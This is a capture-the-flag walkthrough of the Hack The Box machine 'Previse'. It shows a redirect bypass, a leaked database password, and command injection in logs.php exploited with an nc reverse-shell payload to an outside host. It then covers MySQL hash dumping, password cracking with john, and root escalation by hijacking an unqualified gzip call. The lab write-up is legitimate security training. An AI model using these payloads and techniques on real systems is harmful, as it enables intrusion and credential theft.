# Previse

Completed: Yes Created: August 7, 2021 10:29 PM Platform: Hack The Box

## Enumeration

### Nmap

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### http

feroxbuster:

```bash
403        9l       28w      278c http://10.129.206.21/.htpasswd
403        9l       28w      278c http://10.129.206.21/.htpasswd.php
403        9l       28w      278c http://10.129.206.21/.htpasswd.txt
403        9l       28w      278c http://10.129.206.21/.htpasswd.sh
302       93l      238w     3994c http://10.129.206.21/accounts.php
200        0l        0w        0c http://10.129.206.21/config.php
301        9l       28w      312c http://10.129.206.21/css
403        9l       28w      278c http://10.129.206.21/css/.htaccess
403        9l       28w      278c http://10.129.206.21/css/.htpasswd
403        9l       28w      278c http://10.129.206.21/css/.htaccess.php
403        9l       28w      278c http://10.129.206.21/css/.htaccess.txt
403        9l       28w      278c http://10.129.206.21/css/.htaccess.sh
403        9l       28w      278c http://10.129.206.21/css/.htpasswd.php
403        9l       28w      278c http://10.129.206.21/css/.htpasswd.txt
403        9l       28w      278c http://10.129.206.21/css/.htpasswd.sh
302        0l        0w        0c http://10.129.206.21/download.php
200       10l       39w    15406c http://10.129.206.21/favicon.ico
302      112l      263w     4914c http://10.129.206.21/files.php
200        5l       14w      217c http://10.129.206.21/footer.php
200       20l       64w      980c http://10.129.206.21/header.php
302       71l      164w     2801c http://10.129.206.21/index.php
301        9l       28w      311c http://10.129.206.21/js
403        9l       28w      278c http://10.129.206.21/js/.htpasswd
403        9l       28w      278c http://10.129.206.21/js/.htaccess
403        9l       28w      278c http://10.129.206.21/js/.htaccess.php
403        9l       28w      278c http://10.129.206.21/js/.htaccess.txt
403        9l       28w      278c http://10.129.206.21/js/.htaccess.sh
403        9l       28w      278c http://10.129.206.21/js/.htpasswd.php
403        9l       28w      278c http://10.129.206.21/js/.htpasswd.txt
403        9l       28w      278c http://10.129.206.21/js/.htpasswd.sh
200       53l      138w     2224c http://10.129.206.21/login.php
302        0l        0w        0c http://10.129.206.21/logs.php
302        0l        0w        0c http://10.129.206.21/logout.php
200       31l       60w     1248c http://10.129.206.21/nav.php
403        9l       28w      278c http://10.129.206.21/server-status
302       74l      176w     2966c http://10.129.206.21/status.php
```

You can see 302 or 301, but as result, we can have access to some pages without logging in. Just use burp and don't follow the redirection.

Checked `account.php` and found functionality to create a new user. Made a post request and created a new user:

```bash
POST /accounts.php HTTP/1.1
Host: 10.129.206.21
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Connection: close
Cookie: PHPSESSID=1reefoqogj58m0neae8bq7grlc
Upgrade-Insecure-Requests: 1
Content-Length: 56

username=testtesttest&password=testtest&confirm=testtest
```

Now, I can explore the site quietly in a browser :)

Got siteBackup.zip.

Got creds from MySQL:

```bash
cat config.php 
<?php

function connectDB(){
    $host = 'localhost';
    $user = 'root';
    $passwd = 'mySQL_p@ssw0rd!:)';
    $db = 'previse';
    $mycon = new mysqli($host, $user, $passwd, $db);
    return $mycon;
}

?>
```

Tried to download php-reverse-shell.php, but it doesn't execute this file, it just sends the file back to me. So, I continued to explore the source code and found logs.php with command injection:

```bash
cat logs.php   
<?php
session_start();
if (!isset($_SESSION['user'])) {
    header('Location: login.php');
    exit;
}
?>

<?php
if (!$_SERVER['REQUEST_METHOD'] == 'POST') {
    header('Location: login.php');
    exit;
}

/////////////////////////////////////////////////////////////////////////////////////
//I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER//
/////////////////////////////////////////////////////////////////////////////////////

$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
echo $output;

$filepath = "/var/www/out.log";
$filename = "out.log";    

if(file_exists($filepath)) {
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($filepath).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($filepath));
    ob_clean(); // Discard data in the output buffer
    flush(); // Flush system headers
    readfile($filepath);
    die();
} else {
    http_response_code(404);
    die();
} 
?>
```

The command injection is in exec function and it is pretty easy to exploit.

## Gaining access

Exploitation:

```bash
POST /logs.php HTTP/1.1
Host: 10.129.206.21
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.129.206.21/file_logs.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 11
Origin: http://10.129.206.21
Connection: close
Cookie: PHPSESSID=1reefoqogj58m0neae8bq7grlc
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

delim=comma;nc+10.10.14.68+4444+-e+/bin/bash
```

## Privilege escalation

Explored MySQL:

```bash
www-data@previse:/var/www/html$ mysql -h localhost -u root -p 
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 36
Server version: 5.7.35-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| previse            |
| sys                |
+--------------------+
5 rows in set (0.00 sec)

mysql> use previse
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-------------------+
| Tables_in_previse |
+-------------------+
| accounts          |
| files             |
+-------------------+
2 rows in set (0.00 sec)

mysql> select * from accounts
    -> ;
+----+--------------+------------------------------------+---------------------+
| id | username     | password                           | created_at          |
+----+--------------+------------------------------------+---------------------+
|  1 | m4lwhere     | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
|  2 | testtesttest | $1$🧂llol$mxh6P7CVsyxpyK7RtByIu1 | 2021-08-07 19:52:53 |
+----+--------------+------------------------------------+---------------------+
2 rows in set (0.01 sec)

mysql>
```

Finally, cracked this hash:

```bash
$ john -w=/usr/share/wordlists/rockyou.txt m4lwhere_hash --format=md5crypt-long                                 
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovecody112235! (?)
1g 0:00:08:29 DONE (2021-08-12 17:49) 0.001961g/s 14539p/s 14539c/s 14539C/s ilovecody112235!..ilovecoco280
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Checking sudo:

```bash
m4lwhere@previse:/var/backups$ sudo -l
User m4lwhere may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh
```

This user can run this script:

```bash
m4lwhere@previse:/var/backups$ cat /opt/scripts/access_backup.sh
#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
```

You can notice that the gzip binary is specified without a full path. Thus, privesc is pretty simple. create your binary with reverse shell in /tmp and name it as gzip, then execute this script as root and you'll get the root.
